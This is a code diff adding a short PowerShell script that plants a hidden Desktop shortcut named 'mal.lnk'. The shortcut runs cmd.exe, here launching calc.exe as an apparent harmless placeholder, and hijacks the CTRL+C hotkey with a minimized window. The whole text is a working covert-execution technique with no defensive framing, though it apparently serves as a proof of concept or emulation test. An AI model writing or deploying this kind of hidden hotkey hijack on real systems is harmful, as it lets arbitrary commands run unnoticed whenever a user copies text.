@@ -1,0 +1,11 @@
+$malLoc = $home + "\Desktop\mal.lnk"
+
+$WshShell = New-Object -comObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut($malLoc)
+$Shortcut.TargetPath = 'C:\Windows\System32\cmd.exe'
+$Shortcut.Arguments = '/c calc.exe'
+$Shortcut.hotkey = 'CTRL+C'
+$Shortcut.WindowStyle = 7 
+$Shortcut.Save()
+
+attrib +h $malLoc
